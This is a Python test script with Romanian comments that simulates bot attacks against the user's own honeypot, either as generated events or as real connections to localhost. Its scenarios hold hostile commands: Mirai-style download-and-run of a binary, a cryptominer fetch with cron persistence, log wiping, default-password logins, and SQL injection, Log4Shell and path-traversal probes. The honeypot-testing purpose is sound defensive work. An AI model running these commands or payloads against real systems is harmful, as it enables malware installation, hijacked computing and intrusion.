# attacker.py - TU controlezi botul: alegi exact ce face pe capcana VOASTRA.
#
# E un instrument de TEST pentru honeypot-ul vostru. Loveste doar tinta pe care o dai
# (implicit 127.0.0.1 - propriul tau calculator). Shell-ul capcanei e fals, nimic nu se
# executa cu adevarat. NU-l folosi pe servere care nu sunt ale tale.
#
# Doua moduri:
#   sim  (implicit) - construieste evenimente si le trimite direct la receiver.py.
#                     Nu ai nevoie de honeypot. TU alegi daca un login "reuseste".
#                     IP-ul atacatorului poate fi ales sau aleatoriu.
#   real            - se conecteaza CHIAR la honeypot-ul Go (SSH/Telnet/FTP/HTTP).
#                     Capcana primeste conexiunea, o inregistreaza si trimite EA
#                     evenimentele la receiver. Reuseste doar cu parolele slabe pe
#                     care le accepta capcana (root:root, admin:admin, lista Mirai...).
#                     SSH real are nevoie de paramiko:  pip install paramiko
#
# Folosire:
#   python attacker.py                      consola interactiva (sim)
#   python attacker.py --real               consola interactiva, conexiuni reale la capcana
#   python attacker.py --script atacul_meu.py    ruleaza un atac scris de tine in Python
#
# In consola, scrie "help" ca sa vezi comenzile.

import argparse
import json
import secrets
import socket
import time
import urllib.parse
import urllib.request
from datetime import datetime, timezone

RECEIVER_URL = "http://127.0.0.1:8000/api/events"
TOKEN = ""                       # pune aici AGENT_TOKEN daca l-ai setat la receiver
HONEYPOT_HOST = "127.0.0.1"
PORTS = {"ssh": 2222, "telnet": 2323, "ftp": 2121, "http": 8080}
PUBLIC_PORTS = {"ssh": 22, "telnet": 23, "ftp": 21, "http": 80}


def now():
    t = datetime.now(timezone.utc)
    return t.strftime("%Y-%m-%dT%H:%M:%S.") + f"{t.microsecond // 1000:03d}Z"


# ----------------------------------------------------------------------------
# SIM - construieste evenimente si le trimite la receiver (nu atinge honeypot-ul)
# ----------------------------------------------------------------------------

class SimBot:
    """Botul simulat: tu spui ce a facut, iar evenimentele merg direct la receiver."""

    def __init__(self, protocol, ip="auto"):
        self.protocol = protocol.upper()
        self.ip = random_ip() if ip in ("auto", "random") else ip
        self.port = secrets.randbelow(30000) + 30000
        self.session_id = secrets.token_hex(8)
        self.queue = []
        self._event("session_start")

    def _event(self, event_type):
        event = {
            # id unic, ca la agent: un lot retrimis e recunoscut si nu se salveaza de doua ori
            "event_id": secrets.token_hex(8),
            "timestamp": now(),
            "node_id": self.protocol.lower() + "-01",
            "event_type": event_type,
            "source_ip": self.ip,
            "source_port": self.port,
            "target_port": PUBLIC_PORTS[self.protocol.lower()],
            "protocol": self.protocol,
            "simulated": True,
        }
        if self.protocol != "HTTP":
            event["session_id"] = self.session_id
        self.queue.append(event)
        return event

    def login(self, user, password, success=False):
        event = self._event("login_attempt")
        event["credentials"] = {"username": user, "password": password, "success": success}
        print(f"  [sim] login {user}:{password} ({'REUSIT' if success else 'gresit'})")

    def command(self, text, url=""):
        event = self._event("command_exec")
        event["payload_details"] = {"command": text}
        if url:
            event["payload_details"]["extracted_url"] = url
        print(f"  [sim] comanda: {text}")

    def http(self, path, user_agent="Mozilla/5.0"):
        event = self._event("http_request")
        event["payload_details"] = {"http_method": "GET", "http_path": path, "http_user_agent": user_agent}
        print(f"  [sim] http: {path}")

    def close(self):
        self._event("session_end")
        self.send()

    def send(self):
        """Trimite la receiver tot ce s-a strans pana acum."""
        if not self.queue:
            return
        answer = post(self.queue)
        print(f"  -> trimis {answer.get('received')} evenimente, "
              f"{answer.get('alerts_generated')} alerte generate")
        self.queue = []


def random_ip():
    while True:
        parts = [secrets.randbelow(256) for _ in range(4)]
        if parts[0] not in (0, 10, 127, 169, 172, 192, 224, 255):
            return ".".join(str(p) for p in parts)


def post(events):
    data = json.dumps(events).encode("utf-8")
    request = urllib.request.Request(RECEIVER_URL, data=data, headers={"Content-Type": "application/json"})
    if TOKEN:
        request.add_header("Authorization", f"Bearer {TOKEN}")
    with urllib.request.urlopen(request, timeout=5) as response:
        return json.load(response)


# ----------------------------------------------------------------------------
# REAL - se conecteaza chiar la honeypot; capcana inregistreaza si trimite ea
# ----------------------------------------------------------------------------

class RealBot:
    """Botul real: se conecteaza efectiv la capcana. Succesul il decide capcana, nu tu."""

    def __init__(self, protocol, ip=None):
        self.protocol = protocol.upper()
        self.ip = HONEYPOT_HOST
        self.ssh = None
        self.shell = None
        self.sock = None
        if self.protocol in ("TELNET", "FTP"):
            self._open_socket()

    def _open_socket(self):
        port = PORTS[self.protocol.lower()]
        self.sock = socket.create_connection((HONEYPOT_HOST, port), timeout=5)
        self.sock.settimeout(2)
        self._read()  # bannerul de intampinare

    def _read(self):
        try:
            return self.sock.recv(8192).decode("utf-8", "ignore")
        except socket.timeout:
            return ""

    def _send_line(self, text):
        self.sock.sendall((text + "\r\n").encode("utf-8"))
        time.sleep(0.3)
        return self._read()

    def login(self, user, password, success=None):
        """Incearca o parola reala pe capcana. 'success' e ignorat - decide capcana."""
        if self.protocol == "SSH":
            self._ssh_login(user, password)
        elif self.protocol == "TELNET":
            self._send_line(user)
            answer = self._send_line(password)
            print(f"  [real] telnet login {user}:{password} -> {short(answer)}")
        elif self.protocol == "FTP":
            self._send_line("USER " + user)
            answer = self._send_line("PASS " + password)
            print(f"  [real] ftp login {user}:{password} -> {short(answer)}")

    def _ssh_login(self, user, password):
        try:
            import paramiko
        except ImportError:
            print("  [real] SSH are nevoie de paramiko:  pip install paramiko")
            return
        import warnings
        warnings.filterwarnings("ignore")
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            client.connect(HONEYPOT_HOST, PORTS["ssh"], username=user, password=password,
                           allow_agent=False, look_for_keys=False, timeout=5)
            self.ssh = client
            # un shell interactiv: ramane deschis pentru mai multe comenzi (ca un ssh adevarat)
            self.shell = client.invoke_shell()
            time.sleep(0.4)
            self._read_shell()  # bannerul BusyBox + primul prompt
            print(f"  [real] SSH login {user}:{password} -> REUSIT (ai intrat in shell-ul fals)")
        except Exception as error:
            print(f"  [real] SSH login {user}:{password} -> respins ({type(error).__name__})")

    def _read_shell(self):
        answer = ""
        time.sleep(0.3)
        while self.shell.recv_ready():
            answer += self.shell.recv(8192).decode("utf-8", "ignore")
            time.sleep(0.1)
        return answer

    def command(self, text, url=""):
        if self.protocol == "SSH":
            if self.shell is None:
                print("  [real] nu esti logat pe SSH - fa intai un login reusit")
                return
            self.shell.send(text + "\n")
            answer = self._read_shell()
            # scoatem comanda pe care shell-ul o afiseaza inapoi (ecou), ca sa ramana doar raspunsul
            lines = [line for line in answer.splitlines() if line.strip() and text not in line]
            print(f"  [real] {text} -> {short(' '.join(lines))}")
        elif self.protocol in ("TELNET", "FTP"):
            answer = self._send_line(text)
            print(f"  [real] {text} -> {short(answer)}")

    def http(self, path, user_agent="Mozilla/5.0"):
        # codam spatiile/ghilimelele, altfel urllib refuza URL-ul (capcana le decodeaza oricum)
        safe_path = urllib.parse.quote(path, safe="/?=&:%${}[]")
        url = f"http://{HONEYPOT_HOST}:{PORTS['http']}{safe_path}"
        request = urllib.request.Request(url, headers={"User-Agent": user_agent})
        try:
            with urllib.request.urlopen(request, timeout=5) as response:
                response.read()
                print(f"  [real] http {path} -> {response.status}")
        except urllib.error.HTTPError as error:
            print(f"  [real] http {path} -> {error.code}")
        except Exception as error:
            print(f"  [real] http {path} -> {type(error).__name__}")

    def close(self):
        if self.shell is not None:
            try:
                self.shell.send("exit\n")
                time.sleep(0.2)
            except OSError:
                pass
        if self.ssh is not None:
            self.ssh.close()
        if self.sock is not None:
            try:
                self._send_line("exit")
            except OSError:
                pass
            self.sock.close()

    def send(self):
        pass  # in real, capcana trimite singura; nu avem ce trimite


def short(text):
    text = " ".join(text.split())
    return text[:60] if text else "(fara raspuns)"


# un singur punct de intrare: Bot("ssh") sau Bot("ssh", mode="real")
def Bot(protocol, mode="sim", ip="auto"):
    if mode == "real":
        return RealBot(protocol)
    return SimBot(protocol, ip)


# ----------------------------------------------------------------------------
# Scenarii gata facute (merg si in sim, si in real)
# ----------------------------------------------------------------------------

def scenario_mirai(bot):
    bot.login("root", "gresita", False)
    bot.login("root", "vizxv", True)
    bot.command("/bin/busybox ECCHI")
    bot.command("cd /tmp; wget http://203.0.113.10/mirai.arm7; chmod +x mirai.arm7; ./mirai.arm7",
                "http://203.0.113.10/mirai.arm7")


def scenario_miner(bot):
    bot.login("root", "root", True)
    bot.command("uname -a; nproc")
    bot.command("cd /tmp && curl -O http://203.0.113.20/xmrig.tar.gz", "http://203.0.113.20/xmrig.tar.gz")
    bot.command("echo '* * * * * /tmp/xmrig' | crontab -")
    bot.command("history -c; rm -rf /var/log/*")


def scenario_scan(bot):
    for path in ["/.env", "/wp-login.php", "/index.php?id=1' or '1'='1",
                 "/?x=${jndi:ldap://203.0.113.40/a}", "/../../etc/passwd"]:
        bot.http(path, "sqlmap/1.8")


SCENARIOS = {"mirai": scenario_mirai, "miner": scenario_miner, "scan": scenario_scan}


# ----------------------------------------------------------------------------
# Consola interactiva - scrii tu, pas cu pas, ce face botul
# ----------------------------------------------------------------------------

HELP = """
Comenzi:
  ssh | telnet | ftp | http     incepe o sesiune noua pe protocolul ales
  login <user> <parola> [ok]    incearca un login ('ok' = reusit; in real decide capcana)
  cmd <text>                    ruleaza o comanda
  get <url>                     o descarcare (wget-ul e adaugat automat)
  web <cale>                    o cerere web (doar pe http)
  mirai | miner | scan          joaca un scenariu intreg
  ip <adresa|random>            schimba IP-ul atacatorului (doar in sim)
  send                          (sim) trimite ce s-a strans pana acum
  end                           inchide sesiunea curenta
  help                          arata lista asta
  quit                          iesire
"""


def console(mode):
    print(f"=== attacker ({mode}) === tinta: {HONEYPOT_HOST}  (scrie 'help')")
    bot = None
    ip = "auto"

    while True:
        try:
            line = input("atac> ").strip()
        except (EOFError, KeyboardInterrupt):
            print()
            break
        if not line:
            continue
        parts = line.split()
        verb = parts[0].lower()
        rest = line[len(parts[0]):].strip()

        if verb == "quit":
            break
        elif verb == "help":
            print(HELP)
        elif verb in PORTS:
            if bot is not None:
                bot.close()
            bot = Bot(verb, mode, ip)
            print(f"  sesiune {verb.upper()} pornita" + (f" de la {bot.ip}" if mode == "sim" else ""))
        elif verb == "ip":
            ip = rest or "auto"
            print(f"  urmatoarea sesiune va folosi IP-ul: {ip}")
        elif bot is None:
            print("  intai alege un protocol: ssh / telnet / ftp / http")
        elif verb == "login":
            words = rest.split()
            if len(words) < 2:
                print("  folosire: login <user> <parola> [ok]")
            else:
                success = len(words) >= 3 and words[2].lower() == "ok"
                bot.login(words[0], words[1], success)
        elif verb == "cmd":
            bot.command(rest)
        elif verb == "get":
            bot.command(f"wget {rest}", rest)
        elif verb == "web":
            bot.http(rest)
        elif verb in SCENARIOS:
            SCENARIOS[verb](bot)
        elif verb == "send":
            bot.send()
        elif verb == "end":
            bot.close()
            bot = None
            print("  sesiune inchisa")
        else:
            print(f"  nu cunosc '{verb}'. Scrie 'help'.")

    if bot is not None:
        bot.close()
    print("pa.")


def run_script(path, mode):
    """Ruleaza un fisier Python care foloseste Bot(). Ii dam la indemana Bot si scenariile."""
    helpers = {"Bot": Bot, "mode": mode, **{"scenario_" + k: v for k, v in SCENARIOS.items()}}
    with open(path, "r", encoding="utf-8") as f:
        code = f.read()
    exec(compile(code, path, "exec"), helpers)


def main():
    global RECEIVER_URL, TOKEN, HONEYPOT_HOST
    parser = argparse.ArgumentParser(description="controlezi tu ce face botul pe capcana voastra")
    parser.add_argument("--real", action="store_true", help="conexiuni reale la honeypot (altfel: sim)")
    parser.add_argument("--host", default=HONEYPOT_HOST, help="unde e capcana (implicit 127.0.0.1)")
    parser.add_argument("--receiver", default=RECEIVER_URL, help="unde e receiver.py (pentru sim)")
    parser.add_argument("--token", default=TOKEN, help="AGENT_TOKEN, daca receiver-ul cere")
    parser.add_argument("--script", default="", help="ruleaza un atac scris de tine, in loc de consola")
    args = parser.parse_args()

    RECEIVER_URL = args.receiver
    TOKEN = args.token
    HONEYPOT_HOST = args.host
    mode = "real" if args.real else "sim"

    if args.script:
        run_script(args.script, mode)
    else:
        console(mode)


if __name__ == "__main__":
    main()
